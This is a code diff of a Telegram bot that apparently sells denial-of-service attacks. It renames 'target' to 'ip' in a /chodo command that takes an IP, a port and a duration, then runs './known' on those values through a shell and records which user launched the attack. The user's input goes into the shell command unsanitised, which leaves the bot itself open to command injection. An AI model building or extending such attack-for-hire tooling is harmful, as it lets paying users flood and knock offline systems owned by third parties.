@@ -42,7 +42,7 @@ def read_free_users():
 allowed_user_ids = read_users()
 
 # Function to log command to the file
-def log_command(user_id, target, port, time):
+def log_command(user_id, ip, port, time):
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
@@ -50,7 +50,7 @@ def log_command(user_id, target, port, time):
         username = f"UserID: {user_id}"
     
     with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
+        file.write(f"Username: {username}\nip: {ip}\nPort: {port}\nTime: {time}\n\n")
 
 
 # Function to clear logs
@@ -67,10 +67,10 @@ def clear_logs():
     return response
 
 # Function to record command logs
-def record_command_logs(user_id, command, target=None, port=None, time=None):
+def record_command_logs(user_id, command, ip=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
-    if target:
-        log_entry += f" | Target: {target}"
+    if ip:
+        log_entry += f" | ip: {ip}"
     if port:
         log_entry += f" | Port: {port}"
     if time:
@@ -259,11 +259,11 @@ def show_user_id(message):
     bot.reply_to(message, response)
 
 # Function to handle the reply when free users run the /attack
-def start_attack_reply(message, target, port, time):
+def start_attack_reply(message, ip, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"ATTACK start : {target}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahi Dalna"
+    response = f"ATTACK start : {ip}:{port} for {time}\nSEC Jabtak YE Attack run krrha hai to iske bichme koi Attack nahi Dalna"
     bot.reply_to(message, response)
 
     # Dictionary to store the last time each user ran the /chodo command
@@ -286,8 +286,8 @@ def handle_attack(message):
             return
 
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, port, and time
-            target = command[1]
+        if len(command) == 4:  # Updated to accept ip, port, and time
+            ip = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
 
@@ -296,12 +296,12 @@ def handle_attack(message):
             else:
                 attack_running = True  # Set the attack state to running
                 try:
-                    record_command_logs(user_id, '/chodo', target, port, time)
-                    log_command(user_id, target, port, time)
-                    start_attack_reply(message, target, port, time)
+                    record_command_logs(user_id, '/chodo', ip, port, time)
+                    log_command(user_id, ip, port, time)
+                    start_attack_reply(message, ip, port, time)
 
                     # Simulate attack process
-                    full_command = f"./known {target} {port} {time}"
+                    full_command = f"./known {ip} {port} {time}"
                     subprocess.run(full_command, shell=True)
 
                     response = "Attack completed successfully."
@@ -310,7 +310,7 @@ def handle_attack(message):
                 finally:
                     attack_running = False  # Reset the attack state
         else:
-            response = "Usage: /chodo <target> <port> <time>"
+            response = "Usage: /chodo <ip> <port> <time>"
     else:
         response = "ACCESS TOH LELE FREE mai kuch nahi milega FREE mai shrif ghnta milega lega toh bata ."
 
